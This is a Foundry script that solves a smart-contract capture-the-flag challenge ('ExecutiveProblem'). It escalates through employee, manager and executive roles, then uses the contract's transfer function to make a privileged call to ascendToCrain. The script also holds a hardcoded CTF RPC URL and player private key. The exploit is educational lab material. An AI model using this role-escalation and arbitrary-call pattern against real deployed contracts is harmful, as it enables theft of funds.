// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/ExecutiveProblem/Setup.sol";
import {CrainExecutive} from "../src/ExecutiveProblem/CrainExecutive.sol";
import {Crain} from "../src/ExecutiveProblem/Crain.sol";

contract SolveExecutiveProblem is Script {
    address player;
    uint256 playerPrivateKey;
    
    Setup setupInstance;
    Crain crainInstance;
    CrainExecutive crainexecutiveInstance;

    function setUp() external {
        string memory rpcUrl = "http://45.32.119.201:44445/0d23f2a0-9b87-4d16-97e6-f229b6333f46";
        playerPrivateKey = 0xb677ed53c8fa7d19117cad485847604e7afcd0ad343cec9938f49b27c5e25f81;
        address setUpContract = 0x34e25D35648C29f4Da54B8ec74F36a3eC89aD622;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        setupInstance = Setup(setUpContract);
        crainInstance = setupInstance.crain();
        crainexecutiveInstance = setupInstance.cexe();
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);

        crainexecutiveInstance.becomeEmployee();
        crainexecutiveInstance.buyCredit{value: 5 ether}();
        crainexecutiveInstance.becomeManager();
        crainexecutiveInstance.becomeExecutive();

        bytes memory message = abi.encodeCall(crainInstance.ascendToCrain, (address(0x0)));
        crainexecutiveInstance.transfer(address(crainInstance), 0, message);

        console.log("isSolved: ", setupInstance.isSolved());

        vm.stopBroadcast();
    }
}